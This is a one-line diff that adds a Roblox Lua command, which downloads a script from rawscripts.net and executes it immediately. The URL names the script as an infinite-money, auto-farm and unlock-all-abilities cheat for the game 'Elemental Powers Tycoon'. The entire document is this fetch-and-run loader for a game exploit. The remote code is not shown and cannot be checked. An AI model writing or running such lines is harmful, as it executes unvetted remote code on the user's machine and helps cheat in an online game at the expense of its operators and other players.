@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Elemental-Powers-Tycoon-Infinite-Money-Auto-Farm-Get-All-Abilities-126346"))()
